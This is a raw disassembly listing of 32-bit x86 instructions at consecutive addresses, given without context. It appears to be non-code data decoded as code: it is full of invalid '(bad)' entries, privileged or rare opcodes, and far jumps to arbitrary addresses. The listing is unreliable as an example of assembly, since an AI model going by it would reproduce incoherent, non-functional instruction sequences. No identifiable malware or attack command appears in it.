  41d981:	imul   eax,ecx,0x7f
  41d984:	test   bl,bh
  41d986:	add    BYTE PTR [eax],al
  41d988:	icebp  
  41d989:	(bad)  
  41d98b:	sahf   
  41d98c:	clc    
  41d98d:	out    0xc2,al
  41d98f:	aam    0xa8
  41d991:	ins    BYTE PTR es:[edi],dx
  41d992:	mov    ds:0x1eaafe76,al
  41d997:	ja     0x41d9db
  41d999:	mov    ecx,0x2e7d2c8a
  41d99e:	pop    ecx
  41d99f:	mov    bh,BYTE PTR [edx]
  41d9a1:	push   cs
  41d9a2:	ss pop edx
  41d9a4:	jo     0x41d93c
  41d9a6:	enter  0xbb,0x0
  41d9aa:	fsubr  DWORD PTR [ecx]
  41d9ac:	dec    ebx
  41d9ad:	(bad)  
  41d9ae:	push   0xe3f7f2bb
  41d9b3:	lock add DWORD PTR [edx],ecx
  41d9b6:	push   edx
  41d9b7:	cld    
  41d9b8:	jns    0x41d9af
  41d9ba:	jbe    0x41d9c1
  41d9bc:	xor    al,0xf6
  41d9be:	inc    esp
  41d9bf:	mov    WORD PTR [eax],es
  41d9c1:	add    BYTE PTR [esi-0x80],ch
  41d9c4:	call   0x94cc:0x683d0000
  41d9cb:	add    BYTE PTR [eax],al
  41d9cd:	pop    esi
  41d9ce:	mov    ebp,DWORD PTR [edx-0x497e6072]
  41d9d4:	pop    es
  41d9d5:	cdq    
  41d9d6:	loop   0x41d9d0
  41d9d8:	adc    BYTE PTR [esi],dl
  41d9da:	xor    al,0xc0
  41d9dc:	add    eax,DWORD PTR [eax]
  41d9de:	add    ah,bh
  41d9e0:	fwait
  41d9e1:	jmp    0x5265bece
  41d9e6:	mov    esp,0xd31d68da
  41d9eb:	int3   
  41d9ec:	lods   al,BYTE PTR ds:[esi]
  41d9ed:	add    BYTE PTR [eax],al
  41d9ef:	fstp   st(0)
  41d9f1:	(bad)  [esi+0x16]
  41d9f4:	jmp    0x2e05:0x750dff1a
  41d9fb:	or     DWORD PTR [eax],esi
  41d9fd:	(bad)  
  41d9fe:	sub    bh,ch
  41da00:	jg     0x41d9f4
  41da02:	lods   al,BYTE PTR ds:[esi]
  41da03:	dec    esp
  41da04:	pop    ebx
  41da05:	add    BYTE PTR [eax],al
  41da07:	jne    0x41da40
  41da09:	lds    edi,FWORD PTR [edx-0x1385b64a]
  41da0f:	icebp  
  41da10:	add    DWORD PTR [edx-0x53fb9828],0x46b30000
  41da1a:	sub    dh,BYTE PTR [esi-0x2b0c2671]
  41da20:	sbb    esp,DWORD PTR [ebx]
  41da22:	sahf   
  41da23:	sub    al,0x6
  41da25:	sbb    ebp,esi
  41da27:	and    ebp,0x33c4
  41da2d:	stos   DWORD PTR es:[edi],eax
  41da2e:	(bad)  
  41da2f:	inc    eax
  41da30:	pop    esp
  41da31:	add    BYTE PTR [eax],al
  41da33:	xchg   DWORD PTR [edi-0x54264a0],esi
  41da39:	cdq    
  41da3a:	xchg   esp,eax
  41da3b:	jp     0x41da09
  41da3d:	mov    eax,ds:0xfac70000
  41da42:	stos   BYTE PTR es:[edi],al
  41da43:	stos   DWORD PTR es:[edi],eax
  41da44:	sti    
  41da45:	push   esp
  41da46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da47:	dec    ebx
  41da48:	aad    0xa1
  41da4a:	pop    es
  41da4b:	js     0x41d9d5
  41da4d:	push   edx
  41da4e:	add    BYTE PTR [eax],al
  41da50:	je     0x41da52
  41da52:	pusha  
  41da53:	add    BYTE PTR [eax],al
  41da55:	dec    edi
  41da56:	jns    0x41da8e
  41da58:	cld    
  41da59:	arpl   WORD PTR [ebx+0x5444],di
  41da5f:	xchg   ecx,eax
  41da60:	sbb    dh,BYTE PTR [ecx]
  41da62:	(bad)  
  41da63:	jge    0x41da1e
  41da65:	push   es
  41da66:	cld    
  41da67:	jmp    0x293c7fe5
  41da6c:	push   ecx
  41da6d:	inc    esi
  41da6e:	mov    eax,edx
  41da70:	mov    bh,0x96
  41da72:	(bad)  
  41da73:	stos   DWORD PTR es:[edi],eax
  41da74:	pop    eax
  41da75:	std    
  41da76:	lods   al,BYTE PTR ds:[esi]
  41da77:	add    DWORD PTR [edx],edx
  41da79:	aaa    
  41da7a:	and    ch,BYTE PTR [ebx+0x6701fde4]
  41da80:	gs adc dh,ch
  41da83:	arpl   dx,cx
  41da85:	cmp    DWORD PTR [ebp+0x4d81d17c],ecx
  41da8b:	jbe    0x41da8d
  41da8d:	mov    al,BYTE PTR [eax]
  41da8f:	add    dh,bl
  41da91:	push   eax
  41da92:	(bad)  
  41da93:	jg     0x41dadb
  41da95:	fcom   DWORD PTR [esi+ebp*1-0x7c]
  41da99:	loop   0x41da9b
  41da9b:	add    BYTE PTR [ebp-0x1e2b9521],ch
  41daa1:	sub    BYTE PTR [ecx+0x1f5f451b],0x9f
  41daa8:	mov    esp,0xadd9ca82
  41daad:	jnp    0x41da68
  41daaf:	lea    esp,[ebx+0x5e]
  41dab2:	scas   al,BYTE PTR es:[edi]
  41dab3:	lds    esi,FWORD PTR [ebx-0xece4c82]
  41dab9:	mov    bl,BYTE PTR [edx]
  41dabb:	cli    
  41dabc:	or     ah,0x0
  41dabf:	add    BYTE PTR [ecx],bh
  41dac1:	push   ds
  41dac2:	xor    ah,BYTE PTR [eax+0x8]
  41dac5:	mov    ecx,0x691e0000
  41daca:	dec    ebp
  41dacb:	(bad)  
  41dacc:	sar    BYTE PTR [eax-0x13401bb7],1
  41dad2:	outs   dx,BYTE PTR ds:[esi]
  41dad3:	sbb    al,0x54
  41dad5:	lods   eax,DWORD PTR ds:[esi]
  41dad6:	and    al,BYTE PTR [eax]
  41dad8:	pop    edi
  41dad9:	add    BYTE PTR [eax],al
  41dadb:	movd   ebp,mm7
  41dade:	push   eax
  41dadf:	jge    0x41da65
  41dae1:	pop    ebp
  41dae2:	add    BYTE PTR [eax],al
  41dae4:	push   ecx
  41dae5:	mov    DWORD PTR [edx+edi*8-0x12],esi
  41dae9:	inc    edi
  41daea:	pushf  
  41daeb:	repz sub dl,BYTE PTR [edi+edi*8-0x2f]
  41daf0:	arpl   WORD PTR [ebp+0x21],si
  41daf3:	sub    DWORD PTR [bp+si+0x3088],esp
  41daf8:	add    BYTE PTR [eax],al
  41dafa:	push   edi
  41dafb:	dec    edx
  41dafc:	(bad)  
  41dafd:	sbb    al,0x48
  41daff:	sbb    eax,0x7dae0000
  41db04:	jmp    0x6564:0xc1eaa47c
  41db0b:	(bad)  
  41db0c:	adc    dh,BYTE PTR [ebx+0x65795b99]
  41db12:	lods   al,BYTE PTR ds:[esi]
  41db13:	mov    al,0x6
  41db15:	ffreep st(7)
  41db17:	pop    ebp
  41db18:	and    BYTE PTR [ebp-0x3449d7d6],al
  41db1e:	add    eax,0xdc5ab2dc
  41db23:	xchg   cl,ah
  41db25:	imul   esp,DWORD PTR [ebx+0x603de0d3],0x1f
  41db2c:	or     ch,BYTE PTR [esi-0x74]
  41db2f:	cld    
  41db30:	add    BYTE PTR [eax],al
  41db32:	xchg   ebx,eax
  41db33:	xchg   ebp,eax
  41db34:	pop    eax
  41db35:	sti    
  41db36:	jmp    0x41db53
  41db38:	cdq    
  41db39:	ficom  WORD PTR [ecx+0x61]
  41db3c:	xchg   esi,ebx
  41db3e:	adc    al,0x2c
  41db40:	mov    dh,0x7f
  41db42:	pop    edi
  41db43:	jns    0x41dba5
  41db45:	xchg   ecx,eax
  41db46:	jmp    0x9f4f:0x35738749
  41db4d:	sub    al,0x13
  41db4f:	mov    cl,0xee
  41db51:	push   ss
  41db52:	pop    es
  41db53:	xor    DWORD PTR [ecx],0xffffffb9
  41db56:	mov    ds:0xf18d1b82,al
  41db5b:	mov    ah,0x9a
  41db5d:	jbe    0x41db08
  41db5f:	pop    es
  41db60:	add    edx,DWORD PTR [edi+0x3a]
  41db63:	cmp    eax,0x544
  41db68:	sub    DWORD PTR [esi],edi
  41db6a:	fs not dh
  41db6d:	adc    edx,DWORD PTR [ecx+ebx*4+0x4a]
  41db71:	int    0x26
  41db73:	mov    ebx,0xafcac1e
  41db78:	jmp    0x6617:0xcb4b50f5
  41db7f:	xchg   ebp,eax
  41db80:	cmp    esp,DWORD PTR [eax]
  41db82:	xchg   ebx,eax
  41db83:	ss inc edi
  41db85:	iret   
  41db86:	bound  edi,QWORD PTR [ebx+0x2f]
  41db89:	cs out 0x7e,al
  41db8c:	fdivr  QWORD PTR [ebx]
  41db8e:	dec    esp
  41db8f:	dec    eax
  41db90:	add    BYTE PTR [eax],al
  41db92:	call   0x6c6a:0x6401e120
  41db99:	jmp    0xfd9bc9
  41db9e:	add    BYTE PTR [edi+edi*2+0x0],cl
  41dba2:	add    BYTE PTR [edi+0x4952f428],dl
  41dba8:	jecxz  0x41db86
  41dbaa:	in     eax,dx
  41dbab:	sub    BYTE PTR [eax-0x78],dl
  41dbae:	cmp    eax,0x9e400000
  41dbb3:	add    BYTE PTR [eax],al
  41dbb5:	cli    
  41dbb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbb7:	pusha  
  41dbb8:	js     0x41db6a
  41dbba:	pusha  
  41dbbb:	mov    edx,0xe7d34547
  41dbc0:	pop    ecx
  41dbc1:	mov    ebx,esp
  41dbc3:	or     ebp,DWORD PTR ds:0xf34c
  41dbc9:	repz repz mov cl,0x86
  41dbcd:	mov    ah,0xa5
  41dbcf:	sub    ah,BYTE PTR [edx]
  41dbd1:	sti    
  41dbd2:	xor    al,0x4a
  41dbd4:	mov    esp,0xd03f1751
  41dbd9:	popf   
  41dbda:	cs mov ch,0x80
  41dbdd:	xor    eax,DWORD PTR [eax]
  41dbdf:	add    BYTE PTR [edx+0x2c78664d],cl
  41dbe5:	inc    edx
  41dbe6:	jp     0x41dc44
  41dbe8:	mov    edx,0xe292003
  41dbed:	pop    ebp
  41dbee:	jnp    0x41dbdc
  41dbf0:	adc    al,0x75
  41dbf2:	push   esi
  41dbf3:	sbb    BYTE PTR [eax-0x53],ch
  41dbf6:	pop    esp
  41dbf7:	jp     0x41dba4
  41dbf9:	mov    eax,ds:0xf489e369
  41dbfe:	cmp    ecx,DWORD PTR [esi]
  41dc00:	mov    ds:0x46823b7b,eax
  41dc05:	out    0xd5,eax
  41dc07:	arpl   WORD PTR [edi],bp
  41dc09:	cdq    
  41dc0a:	mov    WORD PTR gs:[esi+0x3d290000],ds
  41dc11:	cwde   
  41dc12:	mov    ds:0x57f98a35,eax
  41dc17:	xchg   esp,eax
  41dc18:	lea    ebx,[eax]
  41dc1a:	test   al,0x62
  41dc1c:	les    ebx,FWORD PTR [edx+0x2f4b0000]
  41dc22:	mov    DWORD PTR [ebx+0x7517dc5f],eax
  41dc28:	call   0x7062:0x65930fef
  41dc2f:	jmp    0x585cb330
  41dc34:	clc    
  41dc35:	(bad)  
  41dc36:	pop    ds
  41dc37:	xchg   DWORD PTR [edi],esi
  41dc39:	inc    ebp
  41dc3a:	(bad)  
  41dc3b:	icebp  
  41dc3c:	rcr    DWORD PTR [ecx-0x38],cl
  41dc3f:	add    eax,DWORD PTR [eax]
  41dc41:	add    BYTE PTR [eax],ch
  41dc43:	xlat   BYTE PTR ds:[ebx]
  41dc44:	dec    ebp
  41dc45:	adc    DWORD PTR [eax+0x31686b16],0x369d2eb2
  41dc4f:	xchg   ah,dh
  41dc51:	fcmovne st,st(2)
  41dc53:	in     eax,0xb2
  41dc55:	pushf  
  41dc56:	add    al,0xbe
  41dc58:	add    BYTE PTR [eax],al
  41dc5a:	into   
  41dc5b:	repnz leave 
  41dc5d:	dec    edi
  41dc5e:	in     eax,dx
  41dc5f:	es ret 
  41dc61:	cmp    BYTE PTR [edx+0x22],bh
  41dc64:	mov    ecx,0xa03d223e
  41dc69:	(bad)  
  41dc6a:	pusha  
  41dc6b:	mov    ecx,0xb0737403
  41dc70:	lahf   
  41dc71:	dec    edx
  41dc72:	(bad)  
  41dc73:	sub    cl,BYTE PTR [edi+0x5d08]
  41dc79:	cmp    ch,BYTE PTR [ebp+0x74]
  41dc7c:	aas    
  41dc7d:	push   edi
  41dc7e:	jne    0x41dc36
  41dc80:	push   ebp
  41dc81:	das    
  41dc82:	daa    
  41dc83:	daa    
  41dc84:	mov    bl,0x47
  41dc86:	fidiv  DWORD PTR [esp+ebp*4]
  41dc89:	pop    ss
  41dc8a:	jnp    0x41dc38
  41dc8c:	jb     0x41dcf5
  41dc8e:	nop
  41dc8f:	mov    ds:0xdda55b54,al
  41dc94:	inc    ebp
  41dc95:	adc    al,0x25
  41dc97:	out    dx,eax
  41dc98:	pop    es
  41dc99:	jne    0x41dc85
  41dc9b:	dec    ecx
  41dc9c:	(bad)  
  41dc9d:	stc    
  41dc9e:	mov    ds:0xca0c51,eax
  41dca3:	add    al,cl
  41dca5:	pop    es
  41dca6:	add    BYTE PTR [eax],al
  41dca8:	ins    BYTE PTR es:[edi],dx
  41dca9:	jmp    0x55bc3c65
  41dcae:	sar    DWORD PTR [ebx+0x74],cl
  41dcb1:	mov    ebp,0x89c4
  41dcb6:	imul   BYTE PTR [ecx+edx*8+0x5]
  41dcba:	jne    0x41dc8c
  41dcbc:	test   DWORD PTR [edi-0xf],ebx
  41dcbf:	jp     0x41dd16
  41dcc1:	int    0x67
  41dcc3:	push   eax
  41dcc4:	cmc    
  41dcc5:	push   edi
  41dcc6:	scas   al,BYTE PTR es:[edi]
  41dcc7:	std    
  41dcc8:	jg     0x41dc9d
  41dcca:	adc    edi,DWORD PTR [edi+eax*8]
  41dccd:	adc    al,BYTE PTR [ebx+ebx*8-0x4760000]
  41dcd4:	mov    ah,0x67
  41dcd6:	cmp    ch,BYTE PTR [ebp-0x6c]
  41dcd9:	ja     0x41dd04
  41dcdb:	in     eax,0xd6
  41dcdd:	outs   dx,DWORD PTR cs:[esi]
  41dcdf:	adc    DWORD PTR [ebp+0x38eb063d],ebx
  41dce5:	ss pop ebx
  41dce7:	mov    dl,0x3b
  41dce9:	pop    edx
  41dcea:	cmp    dl,al
  41dcec:	push   ss
  41dced:	and    cl,cl
  41dcef:	arpl   WORD PTR ss:[edi+0x25],dx
  41dcf3:	iret   
  41dcf4:	pop    ss
  41dcf5:	and    eax,0x31f8d6b5
  41dcfa:	mov    ds:0x97220221,eax
  41dcff:	iret   
  41dd00:	add    DWORD PTR [edi],esi
  41dd02:	xor    eax,0x5cdf5e71
  41dd07:	add    ecx,edi
  41dd09:	fimul  DWORD PTR [eax-0x44ffff93]
  41dd0f:	jecxz  0x41dcc6
  41dd11:	mov    ecx,0x3248c307
  41dd16:	add    BYTE PTR [eax],al
  41dd18:	cli    
  41dd19:	push   eax
  41dd1a:	mov    cl,0x85
  41dd1c:	iret   
  41dd1d:	mov    dh,0x44
  41dd1f:	jo     0x41dd21
  41dd21:	add    BYTE PTR [ebx+0x79],cl
  41dd24:	mov    ebp,0x314b70fc
  41dd29:	vcvttps2dq xmm7,XMMWORD PTR [esi+0x1136c293]
  41dd31:	mov    gs,ebp
  41dd33:	out    0x3,eax
  41dd35:	sub    eax,0x8dc47e
  41dd3a:	add    BYTE PTR [esi+0x4],bh
  41dd3d:	inc    esi
  41dd3e:	add    BYTE PTR [eax],al
  41dd40:	loop   0x41dd18
  41dd42:	pop    ds
  41dd43:	(bad)  
  41dd44:	(bad)  
  41dd45:	mov    al,0x8b
  41dd47:	adc    esp,ebx
  41dd49:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41dd4b:	or     BYTE PTR [esi+0x0],0x0
  41dd4f:	retf   0x71a0
  41dd52:	clc    
  41dd53:	inc    esp
  41dd54:	stos   BYTE PTR es:[edi],al
  41dd55:	add    BYTE PTR [eax],al
  41dd57:	test   DWORD PTR [ebx+0xec0],ebx
  41dd5d:	xchg   edi,eax
  41dd5e:	aas    
  41dd5f:	nop
  41dd60:	and    DWORD PTR [ebp-0x29],edx
  41dd63:	in     eax,dx
  41dd64:	loopne 0x41dced
  41dd66:	leave  
  41dd67:	test   DWORD PTR [edx+edx*1-0x32],ebx
  41dd6b:	in     eax,dx
  41dd6c:	mov    ds:0xc5db87c9,eax
  41dd71:	lea    ebp,[ebx+0x52]
  41dd74:	sbb    DWORD PTR [eax-0x108e479e],ebp
  41dd7a:	daa    
  41dd7b:	sbb    BYTE PTR [edi-0x2c020000],0x1f
  41dd82:	jmp    0xda22:0xb9469dee
  41dd89:	mov    al,0x5d
  41dd8b:	dec    edx
  41dd8c:	test   al,0xed
  41dd8e:	lods   eax,DWORD PTR ds:[esi]
  41dd8f:	cmp    eax,0xa62c1d60
  41dd94:	fwait
  41dd95:	xor    ecx,ebx
  41dd97:	push   edx
  41dd98:	jmp    0xba4:0x872939e7
  41dd9f:	pop    ecx
  41dda0:	and    eax,0x592d2fa2
  41dda5:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dda7:	dec    esp
  41dda8:	jno    0x41ddaa
  41ddaa:	add    cl,dh
  41ddac:	fwait
  41ddad:	xchg   BYTE PTR [edx-0x75],cl
  41ddb0:	repnz sub eax,0xa1b677b
  41ddb6:	hlt    
  41ddb7:	test   al,0xf7
  41ddb9:	out    dx,al
  41ddba:	jl     0x41dd59
  41ddbc:	arpl   cx,dx
  41ddbe:	mov    ebx,0xfa002c
  41ddc3:	add    BYTE PTR [eax],ah
  41ddc5:	fwait
  41ddc6:	imul   esi,DWORD PTR [edi-0x1b992a1c],0xf
  41ddcd:	pmulhuw mm2,QWORD PTR [ecx+edx*1-0x1f]
  41ddd2:	and    DWORD PTR [ecx-0x1a],ebx
  41ddd5:	(bad)  
  41ddd6:	mov    bl,0x79
  41ddd8:	inc    edx
  41ddd9:	cs mov esi,0x8284bd
  41dddf:	add    BYTE PTR [edi+0x9b4867],bh
  41dde5:	add    dh,dl
  41dde7:	lds    ecx,FWORD PTR [eax+0x1]
  41ddea:	add    BYTE PTR [eax],al
  41ddec:	ss push ds
  41ddee:	aam    0x8c
  41ddf0:	push   ss
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	jbe    0x41ddb6
  41ddf5:	bound  ebp,QWORD PTR [ecx]
  41ddf7:	xchg   edx,eax
  41ddf8:	jl     0x41de77
  41ddfa:	jae    0x41ddc0
  41ddfc:	sub    eax,0x3b540000
  41de01:	xor    esp,ecx
  41de03:	sbb    al,0x9
  41de05:	sbb    esp,esp
  41de07:	rcl    BYTE PTR [edi],1
  41de09:	ins    DWORD PTR es:[edi],dx
  41de0a:	and    eax,0x7abe10cd
  41de0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de10:	lock jmp 0x81c:0xa853a4e0
  41de18:	rol    BYTE PTR [eax],0x0
  41de1b:	xor    eax,0xd0901945
  41de20:	outs   dx,DWORD PTR ds:[esi]
  41de21:	push   ebp
  41de22:	adc    bl,dl
  41de24:	cmp    ebp,DWORD PTR [ebx-0x430d9b68]
  41de2a:	sub    DWORD PTR [esi],0x39
  41de2d:	arpl   WORD PTR [ecx-0x67cb49a2],bx
  41de33:	sbb    dl,BYTE PTR [eax]
  41de35:	(bad)  
  41de36:	or     al,0xea
  41de38:	add    BYTE PTR [eax],al
  41de3a:	jmp    0x41de7d
  41de3c:	fcmovnbe st,st(6)
  41de3e:	ror    dh,1
  41de40:	xchg   esi,eax
  41de41:	dec    edx
  41de42:	mov    bl,0x7c
  41de44:	jno    0x41de17
  41de46:	fwait
  41de47:	and    DWORD PTR [ecx-0x3368d9aa],edi
  41de4d:	push   edi
  41de4e:	add    BYTE PTR [eax],al
  41de50:	xor    esp,DWORD PTR ds:0x5340
  41de56:	pop    esi
  41de57:	loope  0x41de79
  41de59:	push   esi
  41de5a:	xchg   edx,eax
  41de5b:	mov    ds:0xdda7d421,al
  41de60:	mov    dl,0x76
  41de62:	add    eax,0xc1526751
  41de67:	loope  0x41dea4
  41de69:	mov    eax,0x2b14d822
  41de6e:	sbb    al,0xda
  41de70:	pop    ecx
  41de71:	sbb    dl,bh
  41de73:	push   0xffffff99
  41de75:	lods   al,BYTE PTR ds:[esi]
  41de76:	xchg   ebx,eax
  41de77:	and    al,0x3f
  41de79:	cmp    dh,BYTE PTR [edx+0x28e3bd67]
  41de7f:	mov    ebx,0x227ed678
  41de84:	push   0xff9673c5
  41de89:	push   esi
  41de8a:	loop   0x41de3a
  41de8c:	mov    ecx,0xc348d0
  41de91:	add    BYTE PTR [ebp*2+0x1c842d78],dl
  41de98:	add    BYTE PTR [eax],al
  41de9a:	rol    DWORD PTR [ebp+0x49364b3f],1
  41dea0:	les    esp,FWORD PTR [edx+0x35160000]
  41dea6:	imul   eax,edx,0x12
  41dea9:	(bad)  
  41deaa:	cs je  0x41de55
  41dead:	dec    esi
  41deae:	and    esi,ecx
  41deb0:	retf   
  41deb1:	xor    esp,DWORD PTR [edx]
  41deb3:	sbb    al,bh
  41deb5:	push   esp
  41deb6:	xchg   ebx,eax
  41deb7:	push   edi
  41deb8:	sbb    ch,dl
  41deba:	jecxz  0x41de3c
  41debc:	push   ecx
  41debd:	add    BYTE PTR [eax],al
  41debf:	jmp    0x41deea
  41dec1:	mov    ch,0xce
  41dec3:	retf   0x4caf
  41dec6:	xchg   esi,eax
  41dec7:	add    BYTE PTR [eax],al
  41dec9:	rol    BYTE PTR [esi-0x38],1
  41decc:	dec    ebx
  41decd:	add    BYTE PTR [eax],al
  41decf:	cmp    dh,BYTE PTR [ebx-0x7a429773]
  41ded5:	icebp  
  41ded6:	jns    0x41de84
  41ded8:	ret    0x2a2d
  41dedb:	arpl   WORD PTR [edx],bx
  41dedd:	xlat   BYTE PTR ds:[ebx]
  41dede:	xor    DWORD PTR [esi+ebx*8+0x18],ebx
  41dee2:	loop   0x41deca
  41dee4:	retf   0xbd9f
  41dee7:	icebp  
  41dee8:	fs dec edx
  41deea:	shr    esp,cl
  41deec:	inc    esp
  41deed:	xchg   ebp,eax
  41deee:	add    BYTE PTR [eax],al
  41def0:	sub    eax,DWORD PTR [edx+0xd]
  41def3:	test   ah,bh
  41def5:	add    BYTE PTR [eax],al
  41def7:	movups xmm4,XMMWORD PTR [ebx]
  41defa:	shr    BYTE PTR [edi-0x7f820000],0xe2
  41df01:	add    BYTE PTR [eax],al
  41df03:	dec    edx
  41df04:	pop    edx
  41df05:	fs jo  0x41df20
  41df08:	xor    al,0x23
  41df0a:	dec    esp
  41df0b:	test   BYTE PTR [eax],0x0
  41df0e:	mov    ds:0x876d1824,eax
  41df13:	xlat   BYTE PTR ds:[ebx]
  41df14:	jno    0x41df65
  41df16:	fcomp  DWORD PTR [edx+ecx*8+0x57aea639]
  41df1d:	into   
  41df1e:	dec    edi
  41df1f:	mov    ebx,0x1babc2f0
  41df24:	test   eax,0xa62c2a24
  41df29:	add    edi,DWORD PTR [ecx]
  41df2b:	mov    al,ds:0xd33c9c75
  41df30:	cmp    edi,esi
  41df32:	push   ds
  41df33:	xchg   edi,eax
  41df34:	inc    edi
  41df35:	mov    eax,0x739fe52b
  41df3a:	cmp    BYTE PTR [ebp+ebp*1-0x66],dl
  41df3e:	push   esi
  41df3f:	push   ds
  41df40:	xor    eax,0xc75fb20e
  41df45:	pop    ebp
  41df46:	jmp    0xa2f9b18
  41df4b:	imul   ebx
  41df4d:	test   DWORD PTR [eax+0x39],eax
  41df50:	add    BYTE PTR [eax],al
  41df52:	jo     0x41df45
  41df54:	mov    BYTE PTR [edx+0x7950000],bl
  41df5a:	mov    ebx,0x429dd264
  41df5f:	rol    BYTE PTR [edi+0x0],0x0
  41df63:	in     eax,dx
  41df64:	shl    DWORD PTR [edx],0x6
  41df67:	adc    BYTE PTR [edx-0x42c7fa9d],ah
  41df6d:	jge    0x41df41
  41df6f:	test   eax,0x263ad7b7
  41df74:	jge    0x41dfa3
  41df76:	and    DWORD PTR ds:0x1312acba,edx
  41df7c:	sub    al,0x18
  41df7e:	mov    esi,0xfdd4b87b
  41df83:	dec    ebp
  41df84:	cmc    
  41df85:	jmp    0x0:0x58c0ade3
  41df8c:	and    DWORD PTR [ebp+0x7c],eax
  41df8f:	stc    
  41df90:	dec    esi
  41df91:	int3   
  41df92:	fld    QWORD PTR [eax]
  41df94:	add    BYTE PTR [ebx],al
  41df96:	mov    dl,0x6a
  41df98:	popa   
  41df99:	xor    eax,0xea658624
  41df9e:	dec    esp
  41df9f:	rol    DWORD PTR [eax],0x0
  41dfa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfa3:	repz je 0x41e004
  41dfa6:	icebp  
  41dfa7:	push   es
  41dfa8:	ficom  WORD PTR [esi+0x5600]
  41dfae:	xor    BYTE PTR [edi],bh
  41dfb0:	lea    edx,[ebp+0xec45f]
  41dfb6:	add    BYTE PTR [ebx],ah
  41dfb8:	and    dh,BYTE PTR [esi+0x65]
  41dfbb:	dec    ebx
  41dfbc:	mov    dh,al
  41dfbe:	add    BYTE PTR [eax],al
  41dfc0:	cmp    BYTE PTR [ebp+0x790c65f3],ch
  41dfc6:	add    BYTE PTR [eax],al
  41dfc8:	add    edi,edi
  41dfca:	mov    ds:0xec58bdaf,al
  41dfcf:	shl    ch,cl
  41dfd1:	jbe    0x41dff2
  41dfd3:	(bad)
  41dfd6:	push   edx
  41dfd7:	mov    esp,0x9a23c6ca
  41dfdc:	push   ds
  41dfdd:	sbb    bh,BYTE PTR [ecx+eax*2-0x27938f84]
  41dfe4:	cmp    bh,BYTE PTR ds:0xa1ae172e
  41dfea:	lahf   
  41dfeb:	lods   eax,DWORD PTR ds:[esi]
  41dfec:	sub    eax,0x178467
  41dff1:	add    al,ch
  41dff3:	pcmpgtw mm3,QWORD PTR [edx+0x32b86c73]
  41dffa:	xchg   ebp,eax
  41dffb:	and    BYTE PTR [eax+0x7f000054],al
  41e001:	cld    
  41e002:	icebp  
  41e003:	pushf  
  41e004:	fsub   QWORD PTR [ecx+0x64]
  41e007:	fild   DWORD PTR [edi-0x7ff24299]
  41e00d:	cmp    DWORD PTR [eax],eax
  41e00f:	add    BYTE PTR [esi+0x7d050b54],bh
  41e015:	jo     0x41e014
  41e017:	dec    esi
  41e018:	xor    edx,DWORD PTR [eax+0x2d]
  41e01b:	leave  
  41e01c:	imul   edx,DWORD PTR [edx],0x28924693
  41e022:	fsubrp st(3),st
  41e024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e025:	mov    ebx,0xe9ba688f
  41e02a:	daa    
  41e02b:	jecxz  0x41dfdb
  41e02d:	dec    esi
  41e02e:	xchg   edx,eax
  41e02f:	inc    eax
  41e030:	push   eax
  41e031:	add    BYTE PTR [eax],al
  41e033:	jmp    0x7f0a:0xa7d43e5d
  41e03a:	inc    esp
  41e03b:	rol    DWORD PTR [eax],0x0
  41e03e:	in     eax,0x65
  41e040:	call   0x918d1d6
  41e045:	mov    ebx,0xf7b20000
  41e04a:	adc    al,dl
  41e04c:	retf   
  41e04d:	cmovns eax,DWORD PTR [eax+0x7e]
  41e051:	add    BYTE PTR [eax],al
  41e053:	icebp  
  41e054:	jnp    0x41e01c
  41e056:	and    al,0xfd
  41e058:	pop    esi
  41e059:	pop    ecx
  41e05a:	psrad  mm2,QWORD PTR [ebx+0x16]
  41e05e:	std    
  41e05f:	jecxz  0x41e01c
  41e061:	add    cl,BYTE PTR [ebp-0x25e2aa31]
  41e067:	cmp    ax,0xaf18
  41e06b:	cmc    
  41e06c:	sub    dh,BYTE PTR [eax+0x16]
  41e06f:	inc    ecx
  41e070:	std    
  41e071:	sti    
  41e072:	aas    
  41e073:	jmp    0x41e0cf
  41e075:	call   0xb3ca:0x6cb1d0cd
  41e07c:	xor    cl,dl
  41e07e:	fnsave [edi-0x58d30541]
  41e084:	fimul  WORD PTR [edx+0x2e81927e]
  41e08a:	int3   
  41e08b:	xchg   esi,eax
  41e08c:	add    BYTE PTR [eax],al
  41e08e:	ins    BYTE PTR es:[edi],dx
  41e08f:	mov    DWORD PTR [esi+0xf34c],ecx
  41e095:	fst    st(0)
  41e097:	fidivr DWORD PTR [edx]
  41e099:	mov    ch,dl
  41e09b:	add    BYTE PTR [eax],al
  41e09d:	ja     0x41e036
  41e09f:	mov    bh,0x2f
  41e0a1:	sbb    DWORD PTR [ebp+0x31],esi
  41e0a4:	loopne 0x41e0ed
  41e0a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0a7:	inc    eax
  41e0a8:	mov    ecx,0x74150000
  41e0ad:	inc    eax
  41e0ae:	sub    DWORD PTR [eax],eax
  41e0b0:	add    BYTE PTR [edi],ah
  41e0b2:	rol    DWORD PTR [ecx-0x5a165930],cl
  41e0b8:	out    dx,eax
  41e0b9:	das    
  41e0ba:	push   cs
  41e0bb:	jbe    0x41e075
  41e0bd:	and    cl,BYTE PTR [eax]
  41e0bf:	xor    BYTE PTR [eax],al
  41e0c1:	add    BYTE PTR [esi-0x63],ch
  41e0c4:	outs   dx,BYTE PTR ds:[esi]
  41e0c5:	(bad)  
  41e0c6:	stc    
  41e0c7:	dec    BYTE PTR [edx+0x7294f3f4]
  41e0cd:	dec    esp
  41e0ce:	and    DWORD PTR [eax],eax
  41e0d0:	add    BYTE PTR [edi+0xb0c877b],al
  41e0d6:	add    BYTE PTR [eax],al
  41e0d8:	add    BYTE PTR [ebp+0x76580000],0xa8
  41e0df:	jae    0x41e097
  41e0e1:	das    
  41e0e2:	mov    bl,0x7f
  41e0e4:	imul   ecx,DWORD PTR [ecx+0x1],0xc9fdd4e2
  41e0eb:	sub    edx,DWORD PTR [ebp-0xe519bc4]
  41e0f1:	mov    DWORD PTR [edi+0x7cbe506],eax
  41e0f7:	push   es
  41e0f8:	push   cs
  41e0f9:	arpl   WORD PTR [ebx],bx
  41e0fb:	xor    BYTE PTR [ebx+0x1aae52e1],0x85
  41e102:	dec    ecx
